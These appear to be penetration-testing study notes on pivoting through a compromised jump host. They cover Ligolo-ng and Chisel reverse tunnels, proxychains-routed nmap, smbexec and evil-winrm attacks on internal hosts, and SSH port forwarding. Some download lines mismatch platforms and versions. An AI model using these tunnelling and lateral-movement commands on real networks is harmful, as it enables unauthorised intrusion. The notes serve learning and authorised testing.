## Pivoting for lateral movement (Ligolo-ng)
- https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
- https://systemweakness.com/everything-about-pivoting-oscp-active-directory-lateral-movement-6ed34faa08a2
- Agent (Linux Jump host): `sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_agent_0.4.4_windows_amd64.zip`
- Agent (Windows Jump host):  `sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.4/ligolo-ng_proxy_0.4.4_windows_amd64.zip`
- Proxy (Kali): `sudo wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz`
- tar -xzvf ligolo-ng_agent_0.4.4_linux_amd64.tar.gz
- tar -xzvf ligolo-ng_proxy_0.4.4_linux_amd64.tar.gz
- https://www.calculator.net/ip-subnet-calculator.html
![image](https://github.com/user-attachments/assets/a69cb841-b3be-44da-ad11-2d0b86cb231b)


 ```bash
#Pre-pivoting set up on kali
**##Jumphost is 172.16.5.129 and connects to target 172.16.5.19**
$ sudo ip tuntap add user [your_username] mode tun ligolo
$ sudo ip link set ligolo up

@Attack Machine
./proxy -selfcert -laddr 0.0.0.0:9001

@Jump Host
./agent -connect <attack machine IP>:9001 -ignore-cert

@Attack Machine
#purpose: add a ip route to tell the router to send our packets to that internal network. 
#To add a route and access the internal network execute the command in your attack machine.
sudo ip route add 172.16.4.0/23 dev ligolo

@Attack Machine
#choosing and starting session
session
1
start

@Attack Machine
#open new CMD and RDP to target
rdesktop -u victor -p 'password' 172.16.5.19
```

- [Full guide](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)
  
## Pivoting Using Chisel
- https://blog.mkiesel.ch/posts/oscp_pivoting/
- https://ap3x.github.io/posts/pivoting-with-chisel/ for multi level pivot

```bash
#On your attacking machine (192.168.60.200) setup a Chisel server with:
#PORT = port for the Chisel traffic
#socks5 = to setup a SOCKS5 proxy
#reverse = to tell Chisel to wait for a connection from a client
./chisel server --port 1080 --sock5 --reverse

#On your attacking machine edit the file /etc/proxychains4.conf #1080 is the sock5 port
#Chisel
#1080 is the default port of the Chisel reverse proxy
socks5 127.0.0.1 1080

#on windows jumphost, setup Chisel Client with:
#IP = The IP address of your Chisel server
#PORT = The port you set on your Chisel sever
#R:socks = enables the reverse SOCKS proxy
#max-retry-count 1 = to exit Chisel when you kill your server
#must be same port as chisel server
.\Chisel.exe client --max-retry-count 1 192.168.60.200:1080 R:socks

#You can now attack the third server (ex. 10.0.60.99) by adding proxychains -q before every command. The -q is for quiet mode since most attackers won’t need verbose proxy traffic
#The traffic flows into port 1080 on your machine and out on your jump host, which has established a connection back to your listener on the port you specified when executing chisel server
proxychains -q nmap -sC -sV 10.0.60.99
proxychains -q ssh user@10.0.60.99
proxychains -q mysql -u dbuser -h 10.0.60.99
proxychains -q impacket-smbexec domain\user: -target-ip  10.0.60.99
proxychains -q evil-winrm -i 10.0.60.99 -u 'domain\user' -p ''
proxychains -q xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

#or on attacker's kali, you can connect to the third server using 127.0.0.1 on web browser. If the web browser shows unable to connect, then add thehost name to /etc/hosts
```

## Port forwarding (used when there is firewall)
home-computer/port-80 ----> port-80/proxy-machine/port-21 ----> ftp-server
https://exploit-notes.hdks.org/exploit/network/port-forwarding/port-forwarding-with-chisel/
```bash
#Local Port Forwarding
# In remote machine
chisel server -p <listen-port>

# In local machine
chisel client <listen-ip>:<listen-port> <local-port>:<target-ip>:<target-port>
```

## Port forwarding using SSH
```
#forward all local port 9906 traffic to port 3306 on the remote database.example.com server, letting me point my desktop GUI to localhost (127.0.0.1:9906) and have it behave exactly as if I had exposed port 3306 on the remote server and connected directly to it.
$ ssh -f -N -L 9906:127.0.0.1:3306 coolio@database.example.com
```
